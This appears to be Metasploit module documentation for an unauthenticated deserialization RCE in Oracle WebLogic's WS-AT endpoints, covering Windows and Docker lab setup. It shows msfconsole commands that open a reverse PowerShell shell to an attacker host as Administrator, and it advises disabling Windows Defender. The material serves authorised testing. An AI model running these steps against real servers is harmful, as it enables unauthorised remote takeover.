# Vulnerable Application

Oracle WebLogic server versions 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0 with access to Web Services Atomic Transaction (WS-AT) endpoints are vulnerable to unauthenticated arbitrary command execution.

### Windows: Setting up a vulnerable application

We successfully tested this exploit against a fully-patched, Windows 10 (x64) target.  Since WebLogic is resource intensive, consider providing four cores and 8GB of RAM.

1. [Download](http://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-main-097127.html) Oracle WebLogic Server 10.3.6, using the "Windows x86 with 32-bit JVM" (`wls1036_win32.exe`).
2. Run the installer.  (See [here] for detailed instructions.)  You may be prompted to install a Java Development Kit (JDK).  [JDK 8u151 x64](http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html) was verified working.
3. Windows Defender will block the payload from executing, so you may need to [temporarily](https://support.microsoft.com/en-us/help/4027187/windows-turn-off-windows-defender-antivirus) or [permanently](https://www.windowscentral.com/how-permanently-disable-windows-defender-windows-10) disable it.
4. Run the configuration wizard and [create a new weblogic domain](https://docs.oracle.com/cd/E29542_01/web.1111/e14140/newdom.htm#WLDCW192).  Domain names and credentials are irrelevant.  At the conclusion of the wizard, click "Start Admin Server".
5. The `startWebLogic.cmd` should run immediately after the installer and present logging output.  Once running, the window should output a line similar to the following
```
<Jan 11, 2018 1:30:49 PM CST> <Notice> <WebLogicServer> <BEA-000365> <Server state changed to RUNNING>
<Jan 11, 2018 1:30:49 PM CST> <Notice> <WebLogicServer> <BEA-000360> <Server started in RUNNING mode>
```

### Windows: Attacking a vulnerable application

Attack the above Windows server using the `exploit/multi/http/oracle_weblogic_wsat_deserialization_rce`:

```
msf > use exploit/multi/http/oracle_weblogic_wsat_deserialization_rce
msf exploit(multi/http/oracle_weblogic_wsat_deserialization_rce) > set RHOST [IP address of your target]
msf exploit(multi/http/oracle_weblogic_wsat_deserialization_rce) > set TARGET 0
msf exploit(multi/http/oracle_weblogic_wsat_deserialization_rce) > set PAYLOAD cmd/windows/reverse_powershell
msf exploit(multi/http/oracle_weblogic_wsat_deserialization_rce) > set LHOST [IP address of your attacker]
msf exploit(multi/http/oracle_weblogic_wsat_deserialization_rce) > run

[*] Started reverse TCP handler on 192.168.108.1:4444
[*] Command shell session 1 opened (192.168.108.1:4444 -> 192.168.108.132:50060) at 2018-01-11 11:48:16 -0600

Microsoft Windows [Version 10.0.16299.192]
(c) 2017 Microsoft Corporation. All rights reserved.

C:\Oracle\Middleware\user_projects\domains\admindomain>whoami
weblogic-server\Administrator
```

### Unix: Setting up a vulnerable environment

1. If necessary, install Docker.io.  [These instructions](https://www.ptrace-security.com/2017/06/14/how-to-install-docker-on-kali-linux-2017-1/) were tested on a Kali 2017.3 VM:

```
apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D
echo 'deb https://apt.dockerproject.org/repo debian-stretch main' > /etc/apt/sources.list.d/docker.list
apt update
apt-get install docker-engine
service docker start
docker run hello-world
```

2. Install a container running Ubuntu 16.04 and WebLogic 10.3.6.0:
```
docker run -d -p7001:7001 -p80:7001 kkirsche/cve-2017-10271
```

3. Confirm that the container is up.
```
docker ps
```
